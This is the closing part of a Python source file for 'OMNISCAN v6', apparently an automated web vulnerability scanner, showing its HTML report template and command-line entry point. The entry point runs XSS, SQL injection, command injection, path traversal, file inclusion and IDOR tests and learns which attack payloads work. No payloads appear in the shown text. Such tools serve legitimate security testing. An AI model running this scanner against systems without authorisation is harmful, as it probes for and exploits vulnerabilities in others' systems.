  <div class="sb-brain">
    <div class="sbt">◈ Brain State</div>
    <div class="sbs">Scans learned<span>{bs.get('total_scans',0)}</span></div>
    <div class="sbs">Winners<span>{bs.get('winner_payloads',0)}</span></div>
    <div class="sbs">Mutants generated<span>{bs.get('mutant_payloads',0)}</span></div>
  </div>
  <div class="toc">
    <div class="toct">Findings Index</div>
    {toc_items if toc_items else '<p style="font-size:.74rem;color:var(--lo)">✅ Clean scan</p>'}
  </div>
</aside>

<!-- MAIN -->
<main class="main">
  <div class="hdr">
    <div class="hbadge">⬡ OMNISCAN v6 · Adaptive Security Report</div>
    <h1 class="htitle">Security Assessment Report</h1>
    <p class="hsub">{_open_tab(target)}</p>
  </div>

  <div class="stats">
    {stat_card("CRITICAL",counts.get("CRITICAL",0),"#ef4444")}
    {stat_card("HIGH",    counts.get("HIGH",0),    "#f97316")}
    {stat_card("MEDIUM",  counts.get("MEDIUM",0),  "#eab308")}
    {stat_card("LOW",     counts.get("LOW",0),      "#22c55e")}
    {stat_card("INFO",    counts.get("INFO",0),     "#3b82f6")}
    {stat_card("Endpoints",len(eps),                "#a855f7")}
  </div>

  <div class="sec">
    <div class="sect"><span>📊</span>Executive Summary</div>
    <p style="font-size:.86rem;color:var(--mu)">Assessment of {_open_tab(target,target)} by
    <strong style="color:var(--tx)">OMNISCAN v6.0</strong> (Adaptive Payload Intelligence).
    Found <strong style="color:var(--tx)">{len(vulns)}</strong> confirmed finding(s) across
    <strong style="color:var(--tx)">{len(eps)}</strong> endpoint(s) in
    <strong style="color:var(--tx)">{_esc(dur)}</strong>.</p>
    <p style="margin-top:8px;font-size:.83rem;color:var(--mu)">
    Every finding passed a <strong style="color:var(--lo)">3-stage verification pipeline</strong>
    (re-request + clean baseline + deep pattern check) to minimise false positives.
    Confidence score shown per finding.</p>
    {"<p style='margin-top:10px;font-size:.86rem;color:var(--cr);font-weight:700'>⚠️  Immediate remediation required for CRITICAL/HIGH findings.</p>" if any(v.get('severity') in ['CRITICAL','HIGH'] for v in vulns) else
     "<p style='margin-top:10px;font-size:.86rem;color:var(--lo);font-weight:700'>✅ No high-risk vulnerabilities detected.</p>"}
  </div>

  <div class="sec">
    <div class="sect"><span>⚠️</span>Vulnerabilities <span style="font-size:.78rem;font-weight:400;color:var(--mu)">({len(vulns)} confirmed)</span></div>
    {vulns_html}
  </div>

  <div class="sec">
    <div class="sect"><span>🔍</span>Discovered Endpoints <span style="font-size:.78rem;font-weight:400;color:var(--mu)">({len(eps)})</span></div>
    {'<div style="overflow-x:auto"><table><thead><tr><th>URL</th><th>Status</th><th>Size</th><th>Content-Type</th></tr></thead><tbody>'+ep_rows+'</tbody></table></div>' if eps else "<p style='color:var(--mu)'>None discovered.</p>"}
  </div>

  <div class="sec">
    <div class="sect"><span>🛠</span>Technologies <span style="font-size:.78rem;font-weight:400;color:var(--mu)">({len(techs)})</span></div>
    {'<ul class="tlist">'+tech_items+'</ul>' if techs else "<p style='color:var(--mu)'>None detected.</p>"}
  </div>

  <footer>
    <p>Generated by <strong>OMNISCAN CLI v6.0</strong> — Adaptive Payload Intelligence</p>
    <p style="margin-top:4px;color:#2a4060">Authorized testing only. All findings verified.</p>
  </footer>
</main>
</div>
</body></html>'''

# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════
ALL_TESTS = ['xss','sqli','path','cmdi','lfi','idor','info','http']

def main():
    parser = argparse.ArgumentParser(prog='omniscan', add_help=False)
    parser.add_argument('url', nargs='?')
    parser.add_argument('--tests',       default='all')
    parser.add_argument('--threads',     type=int, default=15)
    parser.add_argument('--timeout',     type=int, default=10)
    parser.add_argument('--output',      default='')
    parser.add_argument('--no-open',     action='store_true')
    parser.add_argument('--json',        action='store_true')
    parser.add_argument('--quiet',       action='store_true')
    parser.add_argument('--brain',       action='store_true')
    parser.add_argument('--reset-brain', action='store_true', dest='reset_brain')
    parser.add_argument('--man',         action='store_true')
    parser.add_argument('-h','--help',   action='store_true')
    args = parser.parse_args()

    if args.man:   print(MAN_PAGE); sys.exit(0)
    if args.help or (not args.url and not args.brain and not args.reset_brain):
        print(BANNER); print(HELP_TEXT); sys.exit(0)

    brain = load_brain()

    if args.reset_brain:
        if os.path.exists(BRAIN_FILE): os.remove(BRAIN_FILE)
        print(f"\n  {FG_GREEN}[✔] Brain wiped. Fresh start.{RST}\n"); sys.exit(0)

    if args.brain:
        print(BANNER); print_brain_status(brain); sys.exit(0)

    target = args.url.strip()
    if not target.startswith(('http://','https://')): target = 'http://' + target
    if not urlparse(target).netloc:
        print(f"{FG_RED}[ERROR] Invalid URL{RST}"); sys.exit(1)

    tests = ({k:True for k in ALL_TESTS} if args.tests.lower()=='all'
             else {k: k in [t.strip().lower() for t in args.tests.split(',')] for k in ALL_TESTS})

    scanner = OMNISCANv6(target, threads=args.threads, timeout=args.timeout,
                         tests=tests, quiet=args.quiet, brain=brain)
    try:
        results = scanner.run()
    except KeyboardInterrupt:
        print(f"\n\n{FG_YELLOW}[!] Interrupted.{RST}"); sys.exit(0)

    print_summary(results)

    html = generate_html_report(results)
    domain = urlparse(target).netloc.replace('www.','').split(':')[0]
    ts_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    safe   = re.sub(r'[^\w\-]','_', domain) or 'omniscan'
    out    = args.output or f"omniscan_{safe}_{ts_str}.html"

    with open(out,'w',encoding='utf-8') as f: f.write(html)
    print(f"  {FG_GREEN}{BOLD}[✔] Report saved:{RST} {FG_CYAN}{BOLD}{out}{RST}")

    if args.json:
        jp = out.replace('.html','.json')
        with open(jp,'w',encoding='utf-8') as f: json.dump(results, f, indent=2, default=str)
        print(f"  {FG_GREEN}{BOLD}[✔] JSON saved :{RST} {FG_CYAN}{BOLD}{jp}{RST}")

    if not args.no_open:
        try: wb_open(f"file://{os.path.abspath(out)}")
        except Exception: pass

    print(f"\n  {FG_PURPLE}◈  Brain updated.{RST} {FG_WHITE}{scanner.brain['total_scans']} scans · "
          f"{sum(len(v) for v in scanner.brain['payload_winners'].values())} winners · "
          f"{sum(len(v) for v in scanner.brain['payload_mutants'].values())} mutants{RST}")
    print(f"  {FG_GREY}Stay ethical. 🔒{RST}\n")

if __name__ == '__main__':
    main()